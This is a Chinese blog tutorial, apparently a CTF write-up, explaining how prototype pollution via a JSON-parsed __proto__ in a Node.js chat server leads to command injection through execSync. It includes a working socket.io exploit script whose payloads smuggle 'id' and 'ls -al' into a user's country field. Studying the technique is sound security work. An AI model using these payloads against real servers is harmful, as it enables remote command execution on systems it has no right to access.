<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getAscii: function(message) &#123;</span><br><span class="line">        var e = require(&apos;child_process&apos;);</span><br><span class="line">        return e.execSync(&quot;cowsay &apos;&quot; + message + &quot;&apos;&quot;).toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在服务端代码中定位到使用此方法的位置：在 join 和 leave 事件里面都有使用：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务端代码</span></span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line">io.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">client</span>) </span>&#123; </span><br><span class="line">    client.on(<span class="string">'register'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">inUser</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            newUser = helper.clone(<span class="built_in">JSON</span>.parse(inUser))</span><br><span class="line"></span><br><span class="line">.........</span><br><span class="line"></span><br><span class="line">    client.on(<span class="string">'join'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">channel</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clientManager.joinChannel(client, channel);</span><br><span class="line">            sendMessageToClient(client,<span class="string">"Server"</span>, </span><br><span class="line">                <span class="string">"You joined channel"</span>, channel)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> u = clientManager.getUsername(client);</span><br><span class="line">            <span class="keyword">var</span> c = clientManager.getCountry(client);</span><br><span class="line"></span><br><span class="line">            sendMessageToChannel(channel,<span class="string">"Server"</span>, </span><br><span class="line">                helper.getAscii(<span class="string">"User "</span> + u + <span class="string">" living in "</span> + c + <span class="string">" joined channel"</span>))</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123; <span class="built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    client.on(<span class="string">'leave'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">channel</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            client .join(channel);</span><br><span class="line">            clientManager.leaveChannel(client, channel);</span><br><span class="line">            sendMessageToClient(client,<span class="string">"Server"</span>, </span><br><span class="line">                <span class="string">"You left channel"</span>, channel)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> u = clientManager.getUsername(client);</span><br><span class="line">            <span class="keyword">var</span> c = clientManager.getCountry(client);</span><br><span class="line">            sendMessageToChannel(channel, <span class="string">"Server"</span>, </span><br><span class="line">                helper.getAscii(<span class="string">"User "</span> + u + <span class="string">" living in "</span> + c + <span class="string">" left channel"</span>))</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123; <span class="built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">server.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'listening on port 3000'</span>);  <span class="comment">// 这里的端口也可以改为本地测试端口</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>参数 u 和 c 是通过模块 clientManager 中的 getUsername 方法和 getCountry 方法得到，跟进到 clientManager.js 文件中：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getUsername: <span class="function"><span class="keyword">function</span> (<span class="params">client</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.clients[client.id].u.name;</span><br><span class="line">  &#125;,</span><br><span class="line">getCountry: <span class="function"><span class="keyword">function</span> (<span class="params">client</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.clients[client.id].u.country;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>直接返回原先服务端注册生成的用户信息，我们来看看那个方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clientManager.registerClient(client, newUser); <span class="comment">// newUser 就是客户端传来的经过 clone 和 JSON.parse() 处理的数据。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clientManager.js</span></span><br><span class="line">registerClient: <span class="function"><span class="keyword">function</span> (<span class="params">client, user</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.clients[client.id] = &#123; <span class="string">'c'</span>: client,</span><br><span class="line">                                    <span class="string">'u'</span>: user,</span><br><span class="line">                                    <span class="string">'ch'</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以上面的 getAscii 方法中的 u 就是我们客户端传入的经过处理的数据，只需让这个对象的 country 属性变得可利用即可，那么可以直接赋值吗？很可惜被黑名单过滤了：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// helper.js</span></span><br><span class="line"> validUser: <span class="function"><span class="keyword">function</span>(<span class="params">inp</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> block = [<span class="string">"source"</span>,<span class="string">"port"</span>,<span class="string">"font"</span>,<span class="string">"country"</span>,</span><br><span class="line">                     <span class="string">"location"</span>,<span class="string">"status"</span>,<span class="string">"lastname"</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> inp !== <span class="string">'object'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>被检测函数的黑名单过滤了，那么就不能直接给 country 属性赋值了，但是我们可以放到其原型里面，所以下面我们就来看看另一个处理传入数据的函数，clone() : </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> obj !== <span class="string">'object'</span> || obj === <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> newObj;</span><br><span class="line">        <span class="keyword">var</span> cloneDeep = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> proto = <span class="built_in">Object</span>.getPrototypeOf(obj);</span><br><span class="line">                <span class="keyword">if</span> (proto &amp;&amp; proto.isImmutable) &#123;</span><br><span class="line">				</span><br><span class="line">                    newObj = obj;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    newObj = <span class="built_in">Object</span>.create(proto);</span><br><span class="line">                    cloneDeep = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            newObj = [];</span><br><span class="line">            cloneDeep = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cloneDeep) &#123;</span><br><span class="line">            <span class="keyword">var</span> keys = <span class="built_in">Object</span>.getOwnPropertyNames(obj);</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; keys.length; ++i) &#123;</span><br><span class="line">                <span class="keyword">var</span> key = keys[i];</span><br><span class="line">                <span class="keyword">var</span> descriptor = <span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, key);</span><br><span class="line">                <span class="keyword">if</span> (descriptor &amp;&amp; (descriptor.get || descriptor.set)) &#123;</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line">                    <span class="built_in">Object</span>.defineProperty(newObj, key, descriptor);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    newObj[key] = <span class="keyword">this</span>.clone(obj[key]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> newObj;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于我们传入的参数直接是对象（JSON.parse() 之后的结果），所以直接定位代码到处理对象的分支：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">            newObj = <span class="built_in">Object</span>.create(proto);</span><br><span class="line">            cloneDeep = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (cloneDeep) &#123;</span><br><span class="line">            <span class="keyword">var</span> keys = <span class="built_in">Object</span>.getOwnPropertyNames(obj);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; keys.length; ++i) &#123;</span><br><span class="line">                <span class="keyword">var</span> key = keys[i];</span><br><span class="line">                <span class="keyword">var</span> descriptor = <span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, key);</span><br><span class="line">                <span class="keyword">if</span> (descriptor &amp;&amp; (descriptor.get || descriptor.set)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="built_in">Object</span>.defineProperty(newObj, key, descriptor);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    newObj[key] = <span class="keyword">this</span>.clone(obj[key]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> newObj;</span><br></pre></td></tr></table></figure>

<p>其中这个方法 <code>getOwnPropertyDescriptor()</code>,返回指定对象上自有属性的对应描述符，由于我们通过 JSON.parse() 方法传入的对象已经具有 __proto__ 这个属性了，所以可以用这个方法获取到。</p>
<p>通过 Object.create() 函数创建对象，原型使用我们构造的对象的原型，即具有普通属性的 __proto__,则可以成功通过这个方法使得 newObj 拥有我们可控的 country 属性，而后面方法 <code>newObj[key]  = this.clone(obj[key])</code> 再写入一次还是这个结果。至此，属性 country 被写入到操作对象中，等待被调用数据，我们构造如下 payload ：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> io = <span class="built_in">require</span>(<span class="string">'socket.io-client'</span>)</span><br><span class="line"><span class="keyword">const</span> socket = io.connect(<span class="string">'https://chat.dctfq18.def.camp'</span>)  <span class="comment">// 测试时换为本地地址</span></span><br><span class="line"></span><br><span class="line">socket.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'received socket error:'</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(err)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">socket.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(msg.from,<span class="string">"["</span>, msg.channel!==<span class="literal">undefined</span>?msg.channel:<span class="string">'Default'</span>,<span class="string">"]"</span>, <span class="string">"says:\n"</span>, msg.message);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">socket.emit(<span class="string">'register'</span>, <span class="string">`&#123;"name":"xxx", "__proto__":&#123;"country":"xxx';id;echo 'xxx"&#125;&#125;`</span>);</span><br><span class="line">socket.emit(<span class="string">'message'</span>, <span class="built_in">JSON</span>.stringify(&#123; <span class="attr">msg</span>: <span class="string">"hello"</span> &#125;));</span><br><span class="line">socket.emit(<span class="string">'register'</span>, <span class="string">`&#123;"name":"xxx", "__proto__":&#123;"country":"xxx';ls -al;echo 'xxx"&#125;&#125;`</span>);</span><br></pre></td></tr></table></figure>

<p>访问触发：</p>
<p><img src="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/15.png" alt="15"></p>
<p>我们总结一下整个调用链：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、客户端传入触发服务端 register 事件时的待解析的数据，包含原型的数据 ------&gt;</span><br><span class="line">2、客户端触发服务端 register 事件，传入数据被 JSON.parse() 方法解析后传入 clone 方法,由于__proto__ 是普通属性，可以将 country 的值赋给返回的对象 ------&gt;</span><br><span class="line">3、返回一个具有 country 属性的对象，值就是我们传入的值，拼接调用 getAscii 方法，执行命令 ------&gt;</span><br><span class="line">4、服务端返回执行命令的消息给客户端，攻击达成</span><br></pre></td></tr></table></figure>

<h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5@ 总结"></a>5@ 总结</h1><p>利用一定的函数特征可以检测出一部分的 api 是否具有潜在的 prototype_pollution 的风险，这里是一位国外学者分析的<a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf" target="_blank" rel="noopener">结果</a>。</p>
<p>其实这种攻击的防御是比较容易的，合并或者给对象属性赋值之前，检查键名是否为 <code>__proto__</code> 等敏感词即可。</p>
<p>Reference:</p>
<p><code>https://segmentfault.com/a/1190000008338987</code></p>
<p><code>https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</code></p>
<p><code>https://juejin.im/entry/58dfbe0361ff4b006b16638</code></p>
<p><code>https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more</code></p>
<p><code>https://stackoverflow.com/questions/8453887/why-is-it-necessary-to-set-the-prototype-constructor</code></p>
<p><code>https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf</code></p>
</div></header><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a class="post__tag__link" href="/tags/javascript/">javascript</a></li><li class="post__tag__item"><a class="post__tag__link" href="/tags/vulneralbility/">vulneralbility</a></li></ul></footer></article><section class="reward"><a class="btn-reward" href="#">打赏</a><div class="reward-wrapper clearfix"><img src="/img/wechat.png" title="微信"></div></section><div class="comments" id="v-container"><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="/js/Valine.min.js"></script><script>new Valine({
  av: AV,
  el: '#v-container',
  app_id: 'i6h8x11R8G9rRGJ0kHtxXf1P-gzGzoHsz',
  app_key: 'Tbq1MIb9WkFtwLmiX9RwAKqJ',
  avatar: 'retro',
  avatarForce: false,
  notify: false,
  verify: false,
  lang: 'zh-cn',
  placeholder: 'balabala~',
  pageSize: 20,
  visitor: true,
  highlight: true,
  emoticon_url: '/img/alu',
  emoticon_list: ["吐.png","喷血.png","狂汗.png","不说话.png","汗.png","坐等.png","献花.png","不高兴.png","中刀.png","害羞.png","皱眉.png","小眼睛.png","中指.png","尴尬.png","瞅你.png","想一想.png","中枪.png","得意.png","肿包.png","扇耳光.png","亲亲.png","惊喜.png","脸红.png","无所谓.png","便便.png","愤怒.png","蜡烛.png","献黄瓜.png","内伤.png","投降.png","观察.png","看不见.png","击掌.png","抠鼻.png","邪恶.png","看热闹.png","口水.png","抽烟.png","锁眉.png","装大款.png","吐舌.png","无奈.png","长草.png","赞一个.png","呲牙.png","无语.png","阴暗.png","不出所料.png","咽气.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png","黑线.png","喜极而泣.png","喷水.png","深思.png","鼓掌.png","暗地观察.png"],
});</script></div></main><footer class="foot"><div class="foot-copy">&copy; 2018 - 2020 rt95</div></footer><script src="/js/scroller.js"></script><script src="/js/main.js"></script></body></html>